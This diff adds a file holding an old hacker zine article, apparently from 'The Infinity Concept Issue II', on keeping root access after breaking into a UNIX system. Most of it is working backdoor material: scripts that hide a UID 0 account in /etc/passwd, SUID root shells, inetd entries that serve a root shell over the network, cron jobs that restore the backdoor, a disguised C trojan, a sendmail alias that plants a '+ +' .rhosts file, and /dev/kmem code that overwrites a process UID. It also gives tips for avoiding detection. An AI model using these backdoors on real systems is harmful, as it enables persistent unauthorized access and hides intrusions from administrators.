@@ -1,0 +1,414 @@
+Ok..... You've been at it for all night. Trying all the exploits you can think of. The system seems tight. The system looks tight.
+The system *is* tight. You've tried everything. Default passwds, guessable passwds, NIS weaknesses, NFS holes, incorrect
+permissions, race conditions, SUID exploits, Sendmail bugs, and so on... Nothing. WAIT! What's that!?!? A "#" ???? Finally!
+After seeming endless toiling, you've managed to steal root. Now what? How do you hold onto this precious super-user
+privilege you have worked so hard to achieve....? 
+
+This article is intended to show you how to hold onto root once you have it. It is intended for hackers and administrators alike.
+From a hacking perspective, it is obvious what good this paper will do you. Admin's can likewise benefit from this paper. Ever
+wonder how that pesky hacker always manages to pop up, even when you think you've completely eradicated him from your
+system?
+This list is BY NO MEANS comprehensive. There are as many ways to leave backdoors into a UNIX computer as there are
+ways into one. 
+
+Beforehand
+
+Know the location of critical system files. This should be obvious (If you can't list any of the top of your head, stop reading
+now, get a book on UNIX, read it, then come back to me...). Familiarity with passwd file formats (including general 7 field
+format, system specific naming conventions, shadowing mechanisms, etc...). Know vi. Many systems will not have those
+robust, user-friendly editors such as Pico and Emacs. Vi is also quite useful for needing to quickly seach and edit a large file. If
+you are connecting remotely (via dial-up/telnet/rlogin/whatver) it's always nice to have a robust terminal program that has a
+nice, FAT scrollback buffer. This will come in handy if you want to cut and paste code, rc files, shell scripts, etc...
+
+The permenance of these backdoors will depend completely on the technical saavy of the administrator. The experienced and
+skilled administrator will be wise to many (if not all) of these backdoors. But, if you have managed to steal root, it is likely the
+admin isn't as skilled (or up to date on bug reports) as she should be, and many of these doors may be in place for some time
+to come. One major thing to be aware of, is the fact that if you can cover you tracks during the initial break-in, no one will be
+looking for back doors.
+
+
+
+The Overt
+
+[1] Add a UID 0 account to the passwd file. This is probably the most obvious and quickly discovered method of rentry. It
+flies a red flag to the admin, saying "WE'RE UNDER ATTACK!!!". If you must do this, my advice is DO NOT simply
+prepend or append it. Anyone causally examining the passwd file will see this. So, why not stick it in the middle... 
+
+#!/bin/csh
+# Inserts a UID 0 account into the middle of the passwd file.
+# There is likely a way to do this in 1/2 a line of AWK or SED.  Oh well.
+# daemon9@netcom.com
+
+set linecount = `wc -l /etc/passwd`
+cd                                      # Do this at home.
+cp /etc/passwd ./temppass               # Safety first.
+echo passwd file has $linecount[1] lines.
+@ linecount[1] /= 2
+@ linecount[1] += 1                     # we only want 2 temp files
+echo Creating two files, $linecount[1] lines each \(or approximately that\).
+split -$linecount[1] ./temppass         # passwd string optional
+echo "EvilUser::0:0:Mr. Sinister:/home/sweet/home:/bin/csh" >> ./xaa
+cat ./xab >> ./xaa
+mv ./xaa /etc/passwd
+chmod 644 /etc/passwd                   # or whatever it was beforehand
+rm ./xa* ./temppass
+echo Done...
+
+NEVER, EVER, change the root password. The reasons are obvious. 
+
+[2] In a similar vein, enable a disabled account as UID 0, such as Sync. Or, perhaps, an account somwhere buried deep in the
+passwd file has been abandoned, and disabled by the sysadmin. Change her UID to 0 (and remove the '*' from the second
+field). 
+
+[3] Leave an SUID root shell in /tmp. 
+
+#!/bin/sh
+# Everyone's favorite...
+
+cp /bin/csh /tmp/.evilnaughtyshell      # Don't name it that...
+chmod 4755 /tmp/.evilnaughtyshell
+
+Many systems run cron jobs to clean /tmp nightly. Most systems clean /tmp upon a reboot. Many systems have /tmp mounted
+to disallow SUID programs from executing. You can change all of these, but if the filesystem starts filling up, people may
+notice...but, hey, this *is* the overt section....). I will not detail the changes neccessary because they can be quite system
+specific. Check out /var/spool/cron/crontabs/root and /etc/fstab. 
+
+
+
+The Veiled
+
+[4] The super-server configuration file is not the first place a sysadmin will look, so why not put one there? First, some
+background info: The Internet daemon (/etc/inetd) listens for connection requests on TCP and UDP ports and spawns the
+appropriate program (usally a server) when a connection request arrives. The format of the /etc/inetd.conf file is simple. Typical
+lines look like this:
+
+(1)     (2)     (3)     (4)     (5)     (6)             (7)
+ftp     stream  tcp     nowait  root    /usr/etc/ftpd   ftpd
+talk    dgram   udp     wait    root    /usr/etc/ntalkd ntalkd
+
+Field (1) is the daemon name that should appear in /etc/services. This tells inetd what to look for in /etc/services to determine
+which port it should associate the program name with. (2) tells inetd which type of socket connection the daemon will expect.
+TCP uses streams, and UDP uses datagrams. Field (3) is the protocol field which is either of the two transport protocols, TCP
+or UDP. Field (4) specifies whether or not the daemon is iterative or concurrent. A 'wait' flag indicates that the server will
+process a connection and make all subsequent connections wait. 'Nowait' means the server will accept a connection, spawn a
+child process to handle the connection, and then go back to sleep, waiting for further connections. Field (5) is the user (or more
+inportantly, the UID) that the daemon is run as. (6) is the program to run when a connection arrives, and (7) is the actual
+command (and optional arguments). If the program is trivial (usally requiring no user interaction) inetd may handle it internally.
+This is done with an 'internal' flag in fields (6) and (7).
+So, to install a handy backdoor, choose a service that is not used often, and replace the daemon that would normally handle it
+with something else. A program that creates an SUID root shell, a program that adds a root account for you in the /etc/passwd
+file, etc...
+For the insinuation-impaired, try this: 
+
+Open the /etc/inetd.conf in an available editor. Find the line that reads: 
+
+        
+        daytime stream  tcp     nowait  root    internal
+
+and change it to: 
+
+        daytime stream  tcp     nowait /bin/sh  sh -i.  
+
+You now need to restart /etc/inetd so it will reread the config file. It is up to you how you want to do this. You can kill and
+restart the process, (kill -9 , /usr/sbin/inetd or /usr/etc/inetd) which will interuppt ALL network connections (so it is a good idea
+to do this off peak hours).
+
+[5] An option to compromising a well known service would be to install a new one, that runs a program of your choice. One
+simple solution is to set up a shell the runs similar to the above backdoor. You need to make sure the entry appears in
+/etc/services as well as in /etc/inetd.conf. The format of the /etc/services file is simple: 
+
+(1)       (2)/(3)          (4)
+smtp      25/tcp           mail    
+
+Field (1) is the service, field (2) is the port number, (3) is the protocol type the service expects, and (4) is the common name
+associated with the service. For instance, add this line to /etc/services:
+
+        evil    22/tcp          evil
+
+and this line to /etc/inetd.conf: 
+
+        evil    stream  tcp     nowait  /bin/sh sh -i
+
+Restart inetd as before. 
+
+Note: Potentially, these are a VERY powerful backdoors. They not only offer local rentry from any account on the system,
+they offer rentry from *any* account on *any* computer on the Internet. 
+
+[6] Cron-based trojan I. Cron is a wonderful system administration tool. It is also a wonderful tool for backdoors, since root's
+crontab will, well, run as root... Again, depending on the level of experience of the sysadmin (and the implementation), this
+backdoor may or may not last. /var/spool/cron/crontabs/root is where root's list for crontabs is usally located. Here, you have
+several options. I will list a only few, as cron-based backdoors are only limited by your imagination. Cron is the clock daemon.
+It is a tool for automatically executing commands at specified dates and times. Crontab is the command used to add, remove,
+or view your crontab entries. It is just as easy to manually edit the /var/spool/crontab/root file as it is to use crontab. A crontab
+entry has six fields:
+
+(1)     (2)     (3)     (4)     (5)     (6)
+ 0       0       *       *       1       /usr/bin/updatedb      
+
+Fields (1)-(5) are as follows: minute (0-59), hour (0-23), day of the month (1-31) month of the year (1-12), day of the week
+(0-6). Field (6) is the command (or shell script) to execute. The above shell script is executed on Mondays. To exploit cron,
+simply add an entry into /var/spool/crontab/root. For example: You can have a cronjob that will run daily and look in the
+/etc/passwd file for the UID 0 account we previously added, and add him if he is missing, or do nothing otherwise (it may not
+be a bad idea to actually *insert* this shell code into an already installed crontab entry shell script, to further obfuscate your
+shady intentions). Add this line to /var/spool/crontab/root: 
+
+        0       0       *       *       *       /usr/bin/trojancode
+
+This is the shell script: 
+
+#!/bin/csh
+# Is our eviluser still on the system?  Let's make sure he is.
+#daemon9@netcom.com
+
+set evilflag = (`grep eviluser /etc/passwd`)    
+
+
+if($#evilflag == 0) then                        # Is he there?
+        
+        set linecount = `wc -l /etc/passwd`
+        cd                                      # Do this at home.
+        cp /etc/passwd ./temppass               # Safety first.
+        @ linecount[1] /= 2
+        @ linecount[1] += 1                     # we only want 2 temp files
+        split -$linecount[1] ./temppass         # passwd string optional
+        echo "EvilUser::0:0:Mr. Sinister:/home/sweet/home:/bin/csh" >> ./xaa
+        cat ./xab >> ./xaa
+        mv ./xaa /etc/passwd
+        chmod 644 /etc/passwd                   # or whatever it was beforehand
+        rm ./xa* ./temppass
+        echo Done...
+else
+endif   
+
+[7] Cron-based trojan II. This one was brought to my attention by our very own Mr. Zippy. For this, you need a copy of the
+/etc/passwd file hidden somewhere. In this hidden passwd file (call it /var/spool/mail/.sneaky) we have but one entry, a root
+account with a passwd of your choosing. We run a cronjob that will, every morning at 2:30am (or every other morning), save a
+copy of the real /etc/passwd file, and install this trojan one as the real /etc/passwd file for one minute (synchronize swatches!).
+Any normal user or process trying to login or access the /etc/passwd file would get an error, but one minute later, everything
+would be ok. Add this line to root's crontab file:
+
+
+        29      2       *       *       *       /bin/usr/sneakysneaky_passwd
+
+make sure this exists: 
+
+#echo "root:1234567890123:0:0:Operator:/:/bin/csh" > /var/spool/mail/.sneaky
+
+and this is the simple shell script: 
+
+#!/bin/csh
+# Install trojan /etc/passwd file for one minute
+#daemon9@netcom.com
+
+cp /etc/passwd /etc/.temppass
+cp /var/spool/mail/.sneaky /etc/passwd
+sleep 60
+mv /etc/.temppass /etc/passwd
+
+[8] Compiled code trojan. Simple idea. Instead of a shell script, have some nice C code to obfuscate the effects. Here it is.
+Make sure it runs as root. Name it something innocous. Hide it well. 
+
+/* A little trojan to create an SUID root shell, if the proper argument is
+given.  C code, rather than shell to hide obvious it's effects. */
+/* daemon9@netcom.com */
+
+#include
+
+#define KEYWORD "industry3"
+#define BUFFERSIZE 10   
+
+int main(argc, argv)
+int argc;
+char *argv[];{
+
+        int i=0;
+
+        if(argv[1]){            /* we've got an argument, is it the keyword? */
+
+                if(!(strcmp(KEYWORD,argv[1]))){
+                        
+                                /* This is the trojan part. */
+                        system("cp /bin/csh /bin/.swp121");
+                        system("chown root /bin/.swp121");
+                        system("chmod 4755 /bin/.swp121");
+                }
+        }
+                                /* Put your possibly system specific trojan
+                                   messages here */
+                                /* Let's look like we're doing something... */
+        printf("Sychronizing bitmap image records.");
+        /* system("ls -alR / >& /dev/null > /dev/null&"); */
+        for(;i<10;i++){ 
+                fprintf(stderr,".");            
+                sleep(1);
+        } 
+        printf("\nDone.\n");
+        return(0);
+} /* End main */
+
+[9] The sendmail aliases file. The sendmail aliases file allows for mail sent to a particular username to either expand to several
+users, or perhaps pipe the output to a program. Most well known of these is the uudecode alias trojan. Simply add the line: 
+
+ "decode: "|/usr/bin/uudecode"
+
+to the /etc/aliases file. Usally, you would then create a uuencoded .rhosts file with the full pathname embedded. 
+
+#! /bin/csh
+
+# Create our .rhosts file.  Note this will output to stdout.
+
+echo "+ +" > tmpfile
+/usr/bin/uuencode tmpfile /root/.rhosts
+
+Next telnet to the desired site, port 25. Simply fakemail to decode and use as the subject body, the uuencoded version of the
+.rhosts file. For a one liner (not faked, however) do this: 
+
+%echo "+ +" | /usr/bin/uuencode /root/.rhosts | mail decode@target.com
+
+You can be as creative as you wish in this case. You can setup an alias that, when mailed to, will run a program of your
+choosing. Many of the previous scripts and methods can be employed here. 
+
+
+
+The Covert
+
+[10] Trojan code in common programs. This is a rather sneaky method that is really only detectable by programs such tripwire.
+The idea is simple: insert trojan code in the source of a commonly used program. Some of most useful programs to us in this
+case are su, login and passwd because they already run SUID root, and need no permission modification. Below are some
+general examples of what you would want to do, after obtaining the correct sourcecode for the particular flavor of UNIX you
+are backdooring. (Note: This may not always be possible, as some UNIX vendors are not so generous with thier sourcecode.)
+Since the code is very lengthy and different for many flavors, I will just include basic psuedo-code: 
+
+get input;
+if input is special hardcoded flag, spawn evil trojan;
+else if input is valid, continue;
+else quit with error;
+...
+
+Not complex or difficult. Trojans of this nature can be done in less than 10 lines of additional code. 
+
+
+
+The Esoteric
+
+[11] /dev/kmem exploit. It represents the virtual of the system. Since the kernel keeps it's parameters in memory, it is possible
+to modify the memory of the machine to change the UID of your processes. To do so requires that /dev/kmem have read/write
+permission. The following steps are executed: Open the /dev/kmem device, seek to your page in memory, overwrite the UID of
+your current process, then spawn a csh, which will inherit this UID. The following program does just that. 
+
+/* If /kmem is is readable and writable, this program will change the user's 
+UID and GID to 0.  */
+/* This code originally appeared in "UNIX security:  A practical tutorial" 
+with some modifications by daemon9@netcom.com */
+
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+
+#define KEYWORD "nomenclature1"
+
+struct user userpage;
+long address(), userlocation;
+
+int main(argc, argv, envp)
+int argc;
+char *argv[], *envp[];{
+
+        int count, fd;
+        long where, lseek();
+        
+        if(argv[1]){            /* we've got an argument, is it the keyword? */
+                if(!(strcmp(KEYWORD,argv[1]))){
+                        fd=(open("/dev/kmem",O_RDWR);
+
+                        if(fd<0){
+                                printf("Cannot read or write to /dev/kmem\n");
+                                perror(argv);
+                                exit(10);       
+                        }
+                                
+                        userlocation=address();
+                        where=(lseek(fd,userlocation,0);
+        
+                        if(where!=userlocation){
+                                printf("Cannot seek to user page\n");
+                                perror(argv);
+                                exit(20); 
+                        }
+
+                        count=read(fd,&userpage,sizeof(struct user));
+        
+                        if(count!=sizeof(struct user)){
+                                printf("Cannot read user page\n");
+                                perror(argv);
+                                exit(30);
+                        }       
+
+                        printf("Current UID: %d\n",userpage.u_ruid);
+                        printf("Current GID: %d\n",userpage.g_ruid);
+                        
+                        userpage.u_ruid=0;
+                        userpage.u_rgid=0;
+                        
+                        where=lseek(fd,userlocation,0);
+
+                        if(where!=userlocation){        
+                                printf("Cannot seek to user page\n");
+                                perror(argv);
+                                exit(40); 
+                        }
+                        
+                        write(fd,&userpage,((char *)&(userpage.u_procp))-((char *)&userpage));
+                        
+                        execle("/bin/csh","/bin/csh","-i",(char *)0, envp);
+                }
+        } 
+
+} /* End main */
+
+#include 
+#include 
+#include 
+
+#define LNULL ((LDFILE *)0)
+
+long address(){
+        
+        LDFILE *object;
+        SYMENT symbol;
+        long idx=0;
+
+        object=ldopen("/unix",LNULL);
+
+        if(!object){
+                fprintf(stderr,"Cannot open /unix.\n");
+                exit(50);
+        }
+
+        for(;ldtbread(object,idx,&symbol)==SUCCESS;idx++){
+                if(!strcmp("_u",ldgetname(object,&symbol))){
+                        fprintf(stdout,"User page is at 0x%8.8x\n",symbol.n_value);
+                        ldclose(object);
+                        return(symbol.n_value);
+                }
+        }
+
+        fprintf(stderr,"Cannot read symbol table in /unix.\n");
+        exit(60);
+}
+
+[12] Since the previous code requires /dev/kmem to be world accessable, and this is not likely a natural event, we need to take
+care of this. My advice is to write a shell script similar to the one in [7] that will change the permissions on /dev/kmem for a
+discrete amount of time (say 5 minutes) and then restore the original permissions. You can add this source to the source in [7]: 
+
+chmod 666 /dev/kmem
+sleep 300               # Nap for 5 minutes
+chmod 600 /dev/kmem     # Or whatever it was before
+
+
+
+From The Infinity Concept Issue II
